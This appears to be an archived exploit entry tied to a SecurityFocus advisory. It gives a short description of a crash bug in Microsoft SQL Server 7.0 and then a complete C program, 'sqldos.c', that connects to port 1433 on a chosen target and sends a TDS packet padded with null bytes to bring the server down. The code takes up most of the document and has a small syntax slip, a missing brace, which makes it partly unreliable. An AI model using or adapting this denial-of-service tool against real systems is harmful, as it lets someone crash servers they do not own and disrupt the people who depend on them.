source: http://www.securityfocus.com/bid/817/info

If Microsoft SQL Server 7.0 receives a TDS header with three or more NULL bytes as data it will crash. The crash will generate an event in the log with ID 17055 "fatal exception EXCEPTION_ACCESS VIOLATION". 

/*
** sqldos.c -- a DoS attack agains MS SQL Server
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define PORT 1433    /* the port SQL Server listens on */


int main(int argc, char *argv[])
{
    int sockfd, numbytes;
    struct hostent *he;
    char buff[65535];
    struct sockaddr_in target_addr;

    if (argc != 2) {
        fprintf(stderr,"Usage: sqldos target\n");
        exit(1);
    }

    if ((he=gethostbyname(argv[1])) == NULL)

        perror("gethostbyname");
        exit(1);
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket error");
        exit(1);
    }

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(PORT);
    target_addr.sin_addr = *((struct in_addr *)he->h_addr);
    bzero(&(target_addr.sin_zero), 8);

    if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct
sockaddr)) == -1) {
        perror("connect error");
        exit(1);
    }
    memset(&buff, 0, 3);

    if ((numbytes=send(sockfd, buff, 14, 0)) == -1) {
        perror("send errot");
        exit(1);
    }
    close(sockfd);

    return 0;
}

